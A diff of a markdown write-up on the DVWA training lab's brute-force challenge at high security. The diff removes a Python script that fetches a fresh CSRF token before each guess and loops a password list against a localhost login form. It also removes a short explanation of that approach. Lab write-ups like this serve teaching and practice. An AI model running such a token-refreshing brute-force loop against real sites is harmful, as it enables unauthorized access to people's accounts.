@@ -143,42 +143,6 @@ Used the discovered password `password` to log in — server responded with **"W
 
 ### 🔴 High Security
 
-A **CSRF token** is added to every login request — it changes on every page load, making Burp Intruder useless. I wrote a Python script that fetches a fresh token before each login attempt.
-
-```python
-import requests
-from bs4 import BeautifulSoup
-
-session = requests.Session()
-url = "http://localhost/dvwa/vulnerabilities/brute/"
-
-# Auto login
-login_url = "http://localhost/dvwa/login.php"
-r = session.get(login_url)
-soup = BeautifulSoup(r.text, "html.parser")
-token = soup.find("input", {"name": "user_token"})["value"]
-session.post(login_url, data={
-    "username": "admin", "password": "password",
-    "Login": "Login", "user_token": token
-})
-
-passwords = ["123456", "password", "admin", "letmein"]
-for password in passwords:
-    r = session.get(url)
-    soup = BeautifulSoup(r.text, "html.parser")
-    token = soup.find("input", {"name": "user_token"})["value"]
-    params = {"username": "admin", "password": password,
-              "Login": "Login", "user_token": token}
-    r2 = session.get(url, params=params)
-    if "Welcome to the password protected area" in r2.text:
-        print(f"[+] Found: {password}")
-        break
-    else:
-        print(f"[-] Wrong: {password}")
-```
-
-> 💡 The script logs in automatically, then loops through passwords — fetching a fresh CSRF token before every single attempt.
-
 ![Brute Force High 1](DVWA/Bruteforce/high1.png)
 
 > 🛠️ Configuration of Burp Suite For CSRF token bypass 
